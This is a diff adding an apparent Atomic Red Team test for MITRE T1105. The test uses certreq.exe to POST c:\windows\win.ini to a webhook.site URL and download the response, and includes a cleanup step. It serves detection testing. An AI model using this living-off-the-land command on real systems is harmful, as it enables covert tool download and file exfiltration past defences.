@@ -1,0 +1,21 @@
+attack_technique: T1105
+display_name: Ingress Tool Transfer
+atomic_tests:
+- name: File download using certreq.exe
+  auto_generated_guid: a3d47faa-9138-44c5-a365-e30eb00db970
+  description: |
+    Uses Certreq.exe to download the response from a POST request. 
+    Since the target url needs to support POST requests, its easiest to enter a webhook.site url.
+  supported_platforms:
+  - windows
+  input_arguments:
+    request_url:
+      description: URL to download from
+      type: url
+      default: https://webhook.site/a6fd372c-e4b3-4ec9-9a39-eb5cb42c9eff/
+  executor:
+    command: |
+      CertReq -Post -config #{request_url} c:\windows\win.ini output.txt
+    cleanup_command: |
+      Remove-Item output.txt
+    name: powershell
